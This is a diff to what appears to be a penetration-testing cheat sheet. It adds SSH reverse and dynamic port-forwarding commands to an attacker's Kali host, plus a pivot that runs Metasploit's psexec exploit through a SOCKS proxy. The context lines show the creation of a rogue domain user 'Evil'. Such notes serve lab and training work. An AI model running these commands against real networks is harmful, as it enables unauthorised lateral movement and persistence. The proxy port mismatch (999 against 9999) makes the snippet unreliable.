@@ -9,7 +9,21 @@ set session 1
 session => 1
 set subnet 172.16.170.0/24
 run
+
+ssh -Nf -R 7000:127.0.0.1:80 root@Kali IP Address
+ssh -Nf -R 7000:127.0.0.1:80 root@192.168.199.104
+ssh -NfD  9050 root@192.168.199.105
 ```
+### Pivoting with SSH Dynamic Port Forwarding
+```
+Setup a dynamic port foward over SSH using port 9999 .
+SSH Login to 10.130.10.22 as we have SSH credential for 10.130.10.22
+ssh -NfD 9999 bgreen@10.130.10.22
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.130.11.13
+msf6 exploit(windows/smb/psexec) > set RPORT 445
+msf6 exploit(windows/smb/psexec) > set Proxies socks4:127.0.0.1:999
+```
+
 ### RDP
 ```
 net user Evil Password123! /add /domain
